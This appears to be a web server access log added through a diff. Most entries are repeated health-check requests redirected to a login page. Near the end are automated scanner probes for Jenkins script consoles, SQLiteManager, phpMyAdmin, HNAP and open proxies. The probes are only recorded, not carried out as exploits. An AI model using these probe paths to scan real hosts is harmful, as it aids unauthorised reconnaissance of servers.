+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:13:09:13 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:13:09:13 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:209.17.96.194 - - [10/Apr/2019:13:11:29 +0000] "GET / HTTP/1.0" 302 28 "-" "Mozilla/5.0 (compatible; Nimbostratus-Bot/v1.3.2; http://cloudsystemnetworks.com)"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:13:14:28 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:13:14:28 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:13:18:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:13:18:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:13:31:24 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:13:31:24 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:13:36:40 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:13:36:40 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:13:40:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:13:40:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:13:53:36 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:13:53:36 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:13:58:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:13:58:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:14:03:14 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:14:03:14 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:14:15:47 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:14:15:47 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:14:21:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:14:21:10 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:14:25:31 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:14:25:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:14:37:59 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:14:37:59 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:14:43:27 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:14:43:27 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:14:47:47 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:14:47:47 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:15:00:11 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:15:00:11 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:15:05:43 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:15:05:43 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:15:10:04 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:15:10:04 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:15:22:22 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:15:22:22 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:15:27:59 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:15:27:59 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:15:32:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:15:32:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:15:44:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:15:44:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.154.101 - - [10/Apr/2019:15:50:14 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.154.101 - - [10/Apr/2019:15:50:14 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:15:54:37 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:15:54:37 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:16:06:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:16:06:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:16:16:53 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:16:16:53 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:16:28:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:16:28:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:16:39:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:16:39:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:16:51:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:16:51:10 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:17:01:25 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:17:01:25 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:17:13:21 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:17:13:21 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:17:23:41 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:17:23:41 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:17:35:33 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:17:35:33 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:17:40:20 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:17:40:20 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:17:45:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:17:45:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:17:57:45 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:17:57:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:18:02:32 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:18:02:32 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.41.46 - - [10/Apr/2019:18:08:14 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.41.46 - - [10/Apr/2019:18:08:14 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:18:19:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:18:19:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:18:24:44 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:18:24:44 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:18:42:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:18:42:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:19:04:21 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:19:04:21 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:19:26:33 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:19:26:33 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:19:48:45 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:19:48:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:194.61.24.189 - - [10/Apr/2019:19:58:36 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:194.61.24.189 - - [10/Apr/2019:19:58:45 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:194.61.24.189 - - [10/Apr/2019:19:58:49 +0000] "GET /HNAP1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:194.61.24.189 - - [10/Apr/2019:19:58:52 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:20:10:56 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:20:10:56 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:20:33:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:20:33:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:20:37:57 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:20:37:57 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:20:55:22 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:20:55:22 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:21:00:09 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:21:00:09 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:21:17:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:21:17:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:21:39:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:21:39:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:22:01:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:22:01:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:22:24:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:22:24:10 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:22:46:22 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:22:46:22 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:23:08:34 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:23:08:34 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:23:30:45 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:23:30:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [10/Apr/2019:23:52:58 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [10/Apr/2019:23:52:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.183.66 - - [10/Apr/2019:23:57:46 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.183.66 - - [10/Apr/2019:23:57:46 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:00:15:10 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:00:15:10 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:184.105.247.195 - - [11/Apr/2019:00:22:17 +0000] "GET / HTTP/1.1" 302 28 "-" "-"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:00:37:23 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
+::ffff:3.16.83.116 - - [11/Apr/2019:00:37:23 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080" "Go-http-client/1.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:19 +0000] "GET / HTTP/1.1" 302 56 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:21 +0000] "GET /login HTTP/1.1" 200 7268 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:26 +0000] "GET http://www.msftncsi.com/ncsi.txt HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:28 +0000] "GET /HNAP1/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:31 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:33 +0000] "GET /hudson/script HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:40 +0000] "GET /script HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:42 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:44 +0000] "GET /sqlite/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:45 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:47 +0000] "GET /sqlitemanager/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:49 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:50 +0000] "GET /SQLiteManager/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:54 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:57 +0000] "GET /SQLite/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:58:58 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:03 +0000] "GET /SQlite/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:06 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:07 +0000] "GET /main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:12 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:19 +0000] "GET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:23 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:24 +0000] "GET /SQLiteManager-1.2.4/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:25 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:26 +0000] "GET /agSearch/SQlite/main.php HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:30 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+redirecting to login
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:34 +0000] "GET /phpmyadmin/ HTTP/1.1" 302 56 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+::ffff:51.83.108.212 - - [11/Apr/2019:00:59:35 +0000] "GET /login HTTP/1.1" 200 7268 "http://3.16.183.224:8080/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
+welcome: Unable to identify user...redirecting to login
+::ffff:3.16.83.116 - - [11/Apr/2019:00:59:36 +0000] "GET / HTTP/1.1" 302 28 "-" "Go-http-client/1.1"
